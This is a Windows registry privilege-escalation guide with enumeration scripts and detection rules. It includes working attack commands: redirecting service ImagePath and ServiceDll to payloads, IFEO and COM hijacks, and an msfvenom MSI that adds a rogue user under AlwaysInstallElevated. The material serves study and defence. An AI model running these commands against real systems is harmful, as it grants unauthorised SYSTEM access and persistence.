# Registry Permission LPE — Deep Dive

Windows registry security model, ACL enforcement on registry keys, all LPE vectors via
writable registry keys: service key modification, autorun manipulation, PATH hijacking
via registry, and environment variable injection.

---

## 1. Windows Registry Architecture

### Registry Hive Structure

The Windows registry is organized into **hives** — logical groupings stored as files on disk:

```
Hive Name   Registry Root Path                     Disk File
──────────  ────────────────────────────────────   ────────────────────────────
HKLM\SAM    HKEY_LOCAL_MACHINE\SAM                 %SystemRoot%\System32\config\SAM
HKLM\SECURITY HKEY_LOCAL_MACHINE\SECURITY          %SystemRoot%\System32\config\SECURITY
HKLM\SYSTEM HKEY_LOCAL_MACHINE\SYSTEM              %SystemRoot%\System32\config\SYSTEM
HKLM\SOFTWARE HKEY_LOCAL_MACHINE\SOFTWARE          %SystemRoot%\System32\config\SOFTWARE
HKLM\HARDWARE HKEY_LOCAL_MACHINE\HARDWARE          (volatile, built at boot, no disk file)
HKCU\...    HKEY_CURRENT_USER                      %UserProfile%\NTUSER.DAT
HKU\.DEFAULT HKEY_USERS\.DEFAULT                   %SystemRoot%\System32\config\DEFAULT
HKU\<SID>   HKEY_USERS\<user SID>                  User's NTUSER.DAT when loaded
HKCR\...    HKEY_CLASSES_ROOT                      Merged HKLM\Software\Classes + HKCU\Software\Classes
```

**HKLM (Local Machine)**: Machine-wide settings. Requires admin/SYSTEM to write in most subkeys.
**HKCU (Current User)**: Per-user settings. Always writable by the current user.
**HKU (Users)**: All loaded user hives. HKCU is just an alias for the current user's SID entry.

### Registry as a Kernel Object Store

Registry keys are kernel objects managed by the **Configuration Manager** (`nt!CmpObjectType`).
Each key has:
- **Security Descriptor**: DACL + SACL (same ACE model as files)
- **Values**: name/type/data pairs (REG_SZ, REG_DWORD, REG_BINARY, REG_EXPAND_SZ, etc.)
- **Subkeys**: hierarchical children
- **Last Write Time**: timestamp of last modification

### Registry Access Rights

```
KEY_QUERY_VALUE           = 0x0001  ← read value data
KEY_SET_VALUE             = 0x0002  ← write/create value → LPE key right
KEY_CREATE_SUB_KEY        = 0x0004  ← create subkeys
KEY_ENUMERATE_SUB_KEYS    = 0x0008  ← list subkeys
KEY_NOTIFY                = 0x0010  ← register change notification
KEY_CREATE_LINK           = 0x0020  ← create registry symbolic link
KEY_WOW64_64KEY           = 0x0100  ← access 64-bit registry view
KEY_WOW64_32KEY           = 0x0200  ← access 32-bit (WOW64) registry view
KEY_READ     = STANDARD_RIGHTS_READ | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY
KEY_WRITE    = STANDARD_RIGHTS_WRITE | KEY_SET_VALUE | KEY_CREATE_SUB_KEY
KEY_ALL_ACCESS = everything above
```

**Attack-relevant right**: `KEY_SET_VALUE` — allows writing any value in the key.
If a user has `KEY_SET_VALUE` on a service's registry key → can change `ImagePath` → SYSTEM.

---

## 2. Default Registry Permissions

### HKLM Default Permissions

```
HKEY_LOCAL_MACHINE\
  SYSTEM: Full Control
  Administrators: Full Control
  Users: Read        ← READ ONLY for standard users
  Creator Owner: Special (usually limited)
```

Most HKLM subkeys inherit this: non-admin users can read but not write.

**Exception areas** (writable by non-admins on default Windows):
```
HKLM\SOFTWARE\Classes          → writable by Users for some specific subkeys
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\  → some entries writable
HKCU\...                        → everything writable by current user
HKCR\...                        → writable in the HKCU-sourced portion
```

### Checking Registry Key Permissions

```powershell
# Get ACL on a registry key:
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\SomeService" | Format-List

# Using accesschk.exe (most reliable):
accesschk.exe -kvusq "Users" HKLM\SYSTEM\CurrentControlSet\Services
# -k: registry keys
# -v: verbose
# -u: suppress errors
# -s: recursive
# -q: quiet (no banner)

# Check if current user can write:
accesschk.exe -kw Users "HKLM\SYSTEM\CurrentControlSet\Services"
```

---

## 3. Technique 1: Writable Service Registry Key

### Most Impactful Registry LPE

Service definitions live under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\`.
If a non-admin user can write to this key (or its `ImagePath` value specifically):

```powershell
# Check all service keys for writability:
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\" | ForEach-Object {
    $acl = Get-Acl $_.PSPath
    $writable = $acl.Access | Where-Object {
        $_.IdentityReference -match "Users|Everyone|Authenticated Users" -and
        $_.RegistryRights -match "SetValue|WriteKey|FullControl|CreateSubKey"
    }
    if ($writable) { 
        Write-Host "[VULN] $($_.Name): $($writable.IdentityReference) → $($writable.RegistryRights)"
    }
}
```

**Exploit**:
```powershell
# Modify service ImagePath:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" `
    -Name "ImagePath" -Value "C:\Users\user\payload.exe"

# Stop and restart service:
Stop-Service VulnService
Start-Service VulnService
# → payload.exe runs as SYSTEM (or whatever ObjectName was)
```

### ServiceDll Subkey Attack

For svchost-hosted services, the DLL path is in a `Parameters` subkey:
```
HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\
    ServiceDll = "C:\Windows\System32\real_service.dll"
```

If `Parameters` subkey is writable:
```powershell
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService\Parameters" `
    -Name "ServiceDll" `
    -Value "C:\Users\user\evil.dll"
```

After restarting the service host → svchost.exe loads `evil.dll` as SYSTEM.

### Persistence in Service Key Without Restart

Some service keys have values read at runtime (not just startup). For example:
- Configuration values read on each service tick
- File paths for log output, temp files
- Plugin/extension DLL paths

These don't require service restart — modification takes effect next time the service reads it.
Research opportunity: trace which registry values each service reads and when.

---

## 4. Technique 2: Autorun / Startup Registry Keys

### Run and RunOnce Keys

Classic autorun locations. These run executables at user logon (or system startup):

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run          ← all users, every logon
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce      ← all users, next logon only
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run          ← current user, every logon
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce      ← current user, next logon

# 64-bit vs 32-bit (WOW64):
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run   ← 32-bit apps on 64-bit Windows
HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

**Execution context**:
- `HKLM\...\Run` entries execute in the context of **whoever logs in** (not SYSTEM)
- They run at explorer.exe startup, in the user's session
- NOT useful for SYSTEM-level LPE directly
- Useful for: persistence, or escalation if the next logon is by an admin

**HKCU Run** (always writable by current user):
- Perfect for persistence in current user's context
- If the current user is admin → runs in admin context at next logon

### Less-Known Autorun Locations

```
# Shell startup folders:
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Startup = C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
              ← If this path is changed to a user-controlled dir → different startup folder

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Common Startup = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
                   ← Writable by admins only, but check actual path ACL

# Winlogon:
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Userinit = C:\Windows\system32\userinit.exe,   ← runs at logon as logged-in user
    Shell = explorer.exe                            ← the shell process

# If writable (unusual, but check):
# Adding to Userinit: "userinit.exe, C:\evil.exe,"
# Changing Shell to evil.exe → replaces explorer → evil.exe gets user session

# AppInit_DLLs (mostly obsolete but worth noting):
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
    AppInit_DLLs = ""  ← If non-empty, loads these DLLs into every process loading user32.dll
    LoadAppInit_DLLs = 0  ← Must be 1 to activate

# AppInit was disabled by default in Win8+ when Secure Boot enabled
# Remains as an attack surface in older systems or with Secure Boot off
```

---

## 5. Technique 3: PATH Hijacking via Registry

### System vs User PATH

Windows %PATH% is built from two registry sources, concatenated:
```
# System-wide PATH:
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
    Path = C:\Windows\System32;C:\Windows;C:\Windows\System32\Wbem;...

# User-specific PATH (prepended to system PATH for that user):
HKCU\Environment
    Path = C:\Users\<user>\AppData\Local\Microsoft\WindowsApps;...
```

When a process starts, its environment inherits:
- System PATH from HKLM (set by system/admin)
- User PATH from HKCU (set by user)
- Combined: User PATH + System PATH (user directories come first)

### User PATH Hijacking

Since `HKCU\Environment` is always writable by the current user:

```powershell
# Add attacker's directory at the start of user PATH:
$currentPath = (Get-ItemProperty -Path "HKCU:\Environment" -Name Path -ErrorAction SilentlyContinue).Path
Set-ItemProperty -Path "HKCU:\Environment" -Name Path -Value "C:\evil;$currentPath"

# → For new processes started by this user, C:\evil\ is searched first for executables
# → If a SYSTEM-run process inherits this user's environment:
#      → DLL/EXE in C:\evil\ takes priority
```

**When does a SYSTEM process inherit user PATH?**
- Services that explicitly propagate user environment to subprocesses
- `CreateProcessWithTokenW` with `LOGON_WITH_PROFILE` → loads user profile including environment
- Task Scheduler tasks run in the user's session may inherit user environment
- Rarely: interactive services that spawn child processes

**More commonly useful for lateral movement / persistence** than direct SYSTEM LPE.

### System PATH Hijacking (Requires Admin for KEY but Check Binary ACLs)

Even if HKLM\...\Environment is not directly writable by a non-admin, look at whether
any directory currently in the system PATH is user-writable:
```powershell
$env:PATH -split ';' | ForEach-Object {
    $dir = $_
    if (Test-Path $dir -PathType Container) {
        $acl = Get-Acl $dir -ErrorAction SilentlyContinue
        $writable = $acl.Access | Where-Object {
            $_.IdentityReference -match "Users|Everyone|Authenticated Users" -and
            $_.FileSystemRights -match "Write|Modify|FullControl"
        }
        if ($writable) { Write-Host "[WRITABLE PATH DIR] $dir" }
    }
}
```

---

## 6. Technique 4: Image File Execution Options (IFEO) — Debugger Hijacking

### What Is IFEO?

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe_name>\`

Originally for attaching a debugger to specific executables at launch. The `Debugger` value,
if set, causes Windows to launch the debugger instead of the specified executable, with the
original binary path passed as an argument.

**Normal use**:
```
HKLM\...\Image File Execution Options\notepad.exe\
    Debugger = "C:\debuggers\windbg.exe"
```
Launching `notepad.exe` actually launches `windbg.exe "path\to\notepad.exe"`.

### LPE via IFEO (if writable)

If the IFEO key or its subkeys are writable by non-admins (unusual but check):
```
HKLM\...\Image File Execution Options\utilman.exe\
    Debugger = C:\Users\user\evil.exe

# Now: when utilman.exe is launched (from lock screen → Accessibility button):
# evil.exe runs instead, as SYSTEM (Winlogon context at lock screen)
```

**More realistic scenario**: IFEO key for a specific application is writable (custom app
installed with bad permissions on its IFEO entries).

### Silently Exit Monitoring (SEM) — Related

`GlobalFlag` value in IFEO can enable heap debugging, which triggers loading `ntdll.dll`
extension DLLs via `VerifierDlls` value. If these values are writable → DLL injection into
target process.

```
HKLM\...\Image File Execution Options\<target.exe>\
    GlobalFlag = 0x200       ← FLG_HEAP_ENABLE_TAIL_CHECK (example)
    VerifierDlls = evil.dll  ← loaded by ntdll into target process
```

---

## 7. Technique 5: COMplus Runtime / .NET Registry Hijacking

### COR_PROFILER via Registry

The .NET runtime checks registry for profiler configuration:
```
HKCU\Environment\  (or process environment)
    COR_ENABLE_PROFILING = 1
    COR_PROFILER = {CLSID-of-profiler}
    COR_PROFILER_PATH = C:\path\to\profiler.dll
```

If set for the current user's environment:
- Any .NET process started by this user will load the profiler DLL
- The profiler DLL's `ICorProfilerCallback` is initialized before any managed code runs

**Attack scenario**: Attacker sets `COR_PROFILER_PATH` to evil DLL in HKCU\Environment.
A SYSTEM .NET task/service that runs in the user's session or with the user's environment
→ loads evil profiler DLL → code execution in that process's context.

**Stability caveat**: Profiler DLL must implement the `ICorProfilerCallback` interface
(or at least not crash when the runtime tries to use it).

---

## 8. Technique 6: Writable Registry for Application Plugins/Extensions

Many applications store plugin/extension DLL paths in the registry:
```
HKLM\SOFTWARE\<Company>\<App>\
    PluginPath = "C:\Program Files\App\plugins\"
    Plugin1Dll = "C:\Program Files\App\plugins\feature1.dll"
```

If these values are writable by non-admins:
```
→ Change PluginPath to C:\Users\user\evil_plugins\
→ Or change Plugin1Dll to C:\Users\user\evil.dll
→ Next time app loads plugin → evil DLL loaded at app's integrity
```

**Scope**: Limited to applications that:
1. Store plugin paths in writable registry locations
2. Run at elevated integrity (as SYSTEM, admin session, etc.)
3. Load plugins at runtime (not just startup)

**Finding these**: ProcMon filter `RegOpenKey` + `Name Contains .dll` + process is elevated.

---

## 9. Technique 7: AlwaysInstallElevated

### What It Is

A Group Policy setting that causes Windows Installer to install `.msi` packages with SYSTEM
privileges, regardless of the installing user's permissions:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated = 1 (DWORD)

HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated = 1 (DWORD)
```

Both must be set (HKLM AND HKCU) for the feature to be active.

**Attack**:
```
# Check if enabled:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 1:
# Create MSI that runs a command as SYSTEM:
msfvenom -p windows/x64/exec CMD="net user evil P@ss /add" -f msi > payload.msi
# Or use PowerUp: Write-UserAddMSI → creates msi that adds user to admins

# Install:
msiexec /quiet /qn /i payload.msi
# → Runs as SYSTEM → command executes as SYSTEM
```

**Why it exists**: Allows software deployment for users who don't have admin rights but
need to install specific software. Common in enterprise environments with poor GPO hygiene.

---

## 10. Technique 8: Writable Auto-Elevation COM Registry Entries

Connecting registry to COM: if a COM auto-elevation CLSID's registry entry is writable
by non-admins, modify the `InprocServer32` DLL path to point to attacker's DLL.

```
# HKLM registration for auto-elevation CLSID:
HKLM\SOFTWARE\Classes\CLSID\{6EDD6D74-...}\InprocServer32
    (Default) = C:\Windows\System32\cmlua.dll

# If writable by non-admin (unusual, but worth checking):
reg add "HKLM\SOFTWARE\Classes\CLSID\{6EDD6D74-...}\InprocServer32" /ve /t REG_SZ /d "C:\evil.dll" /f
# → Auto-elevation activation loads evil.dll at High integrity → LPE
```

This requires the HKLM registry key to be writable (unusual but seen in misconfigured
enterprise deployments or with specific software's registry entries).

---

## 11. Ferrum's Registry Module

Ferrum's `registry` module checks:

1. **Service registry keys writable**: scan `HKLM\SYSTEM\CurrentControlSet\Services\`
   for keys/values writable by current user.

2. **Autorun registry keys writable**: check `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
   and related autorun locations for write access.

3. **AlwaysInstallElevated check**: query both HKLM and HKCU installer policy values.

4. **AppInit_DLLs**: check if enabled and if the value is modifiable.

5. **Winlogon values**: check if `Userinit` or `Shell` values are writable.

---

## 12. Enumeration Commands

```powershell
# AlwaysInstallElevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null

# AppInit_DLLs:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs

# Winlogon:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell

# Autorun check:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Service registry ACL check (accesschk):
accesschk.exe -kvusq "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services 2>$null
accesschk.exe -kvusq "Users" HKLM\SYSTEM\CurrentControlSet\Services 2>$null

# IFEO check:
accesschk.exe -kw "Users" "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" 2>$null

# PowerUp auto-check:
Invoke-AllChecks  # includes registry checks
```

---

## 13. Detection

### Event 4657 — A Registry Value Was Modified
```
Object Name: \REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath
New Value: C:\Users\attacker\payload.exe
Subject Username: attacker_user
```

Alert on:
- Write to `HKLM\...\Services\*\ImagePath` by non-SYSTEM/non-admin account
- Write to `HKLM\...\Services\*\Parameters\ServiceDll` by non-SYSTEM account
- Write to `HKLM\...\CurrentVersion\Run` by unexpected process
- Setting `AlwaysInstallElevated = 1`
- Write to `HKLM\...\Winlogon\Userinit` or `Shell`
- Write to `HKLM\...\Image File Execution Options\*\Debugger`
- Setting `AppInit_DLLs` to non-empty value

### Sysmon Event 13: Registry Value Set
Most useful Sysmon event for registry monitoring:
```xml
<RegistryEvent>
  <EventType>SetValue</EventType>
  <TargetObject>HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath</TargetObject>
  <!-- Alert if InitiatingProcessUser not in {SYSTEM, TrustedInstaller, Admin} -->
</RegistryEvent>
```

### Defender for Endpoint (Advanced Hunting)
```kusto
DeviceRegistryEvents
| where RegistryKey contains "CurrentControlSet\\Services" 
    and RegistryValueName == "ImagePath"
    and InitiatingProcessAccountName !in ("SYSTEM", "TrustedInstaller")
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueData
```

---

## 14. Summary: Registry LPE Decision Tree

```
Registry-based LPE attack surface:

1. Service keys writable?
   HKLM\SYSTEM\CurrentControlSet\Services\<svc>\
     → Change ImagePath → restart service → SYSTEM

2. Autorun writable (HKLM)?
   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
     → Add payload → runs at next user logon (user context, not SYSTEM)
     → Useful for persistence; not direct SYSTEM LPE

3. AlwaysInstallElevated active?
   HKLM\...\Installer\AlwaysInstallElevated = 1 AND
   HKCU\...\Installer\AlwaysInstallElevated = 1
     → Craft malicious MSI → msiexec /quiet /i evil.msi → SYSTEM execution

4. Winlogon values writable?
   HKLM\...\Winlogon\Userinit or Shell writable
     → Add payload to Userinit or replace Shell
     → Executes at logon in user context (with user's full token)

5. IFEO Debugger writable?
   HKLM\...\Image File Execution Options\<target>\Debugger writable
     → Set Debugger to payload
     → When target launches → payload runs instead (at target's integrity)

6. AppInit_DLLs (legacy, mostly Win7/8):
   HKLM\...\Windows\AppInit_DLLs writable + LoadAppInit_DLLs = 1
     → Set to evil DLL path
     → Every process loading user32.dll loads evil DLL
     → If SYSTEM process loads user32.dll → SYSTEM code execution

7. User PATH registry writable (always true for HKCU):
   HKCU\Environment\Path
     → Prepend C:\evil\ to user PATH
     → Processes started by this user find DLLs/EXEs in C:\evil\ first
     → Indirect LPE if SYSTEM service inherits user environment
```
